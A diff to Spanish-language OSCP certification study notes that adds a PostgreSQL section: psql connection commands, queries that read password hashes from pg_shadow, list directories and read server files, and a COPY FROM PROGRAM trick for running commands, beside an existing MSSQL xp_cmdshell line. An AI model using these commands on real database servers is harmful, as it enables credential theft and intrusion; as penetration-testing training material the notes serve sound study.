@@ -63,7 +63,9 @@ Apuntes para la certificación OSCP.
         * 4.4.4. [Comandos básicos](#comandos-básicos-1)
         * 4.4.5. [Mostrar el contenido de una base de datos](#mostrar-el-contenido-de-una-base-de-datos)
         * 4.4.6. [Ejecución de código](#ejecución-de-código)
-    * 4.5. [POSTGRESQL (5432)](#postgresql-(5432))
+    * 4.5. [PostgreSQL (5432)](#postgresql-(5432))
+        * 4.5.1. [Comandos Comunes](#comandos-comunes)
+        * 4.5.2. [Ejecución Remota de Código](#ejecución-remota-de-código)
     * 4.6. [SNMP (161 - UDP)](#snmp-(161---udp))
     * 4.7. [RDP (3389)](#rdp-(3389))
         * 4.7.1. [xfreerdp](#xfreerdp)
@@ -946,7 +948,43 @@ De esta forma, ya podemos ejecutar comandos:
 ```sql
 EXECUTE xp_cmdshell 'whoami'
 ```
-###  4.5. <a name='postgresql-(5432)'></a>POSTGRESQL (5432)
+###  4.5. <a name='postgresql-(5432)'></a>PostgreSQL (5432)
+
+```sql
+psql
+psql -h <LHOST> -U <USERNAME> -c "<COMMAND>;"
+psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
+psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
+```
+
+####  4.5.1. <a name='comandos-comunes'></a>Comandos Comunes
+
+```sql
+postgres=# \list                                                            // listar todas las bases de datos
+postgres=# \c                                                               // seleccionar una base de datos
+postgres=# \c <DATABASE>                                                    // seleccionar una base de datos especifica
+postgres=# \s                                                               // historial de comandos
+postgres=# \q                                                               // salir
+<DATABASE>=# \dt                                                            // listar las tablas del schema actual
+<DATABASE>=# \dt *.*                                                        // listar las tablas de todos los schema
+<DATABASE>=# \du                                                            // listar los roles de usuario
+<DATABASE>=# \du+                                                           // listar los roles de usuario
+<DATABASE>=# SELECT user;                                                   // mostar el usuario actual
+<DATABASE>=# TABLE <TABLE>;                                                 // seleccionar una tabla
+<DATABASE>=# SELECT usename, passwd from pg_shadow;                         // Leer credenciales
+<DATABASE>=# SELECT * FROM pg_ls_dir('/'); --                               // Leer directorios
+<DATABASE>=# SELECT pg_read_file('/PATH/TO/FILE/<FILE>', 0, 1000000); --    // Leer un archivo
+```
+
+####  4.5.2. <a name='ejecución-remota-de-código'></a>Ejecución Remota de Código
+
+```sql
+<DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
+<DATABASE>=# CREATE TABLE cmd_exec(cmd_output text);
+<DATABASE>=# COPY cmd_exec FROM PROGRAM 'id';
+<DATABASE>=# SELECT * FROM cmd_exec;
+<DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
+```
 
 ###  4.6. <a name='snmp-(161---udp)'></a>SNMP (161 - UDP)
 
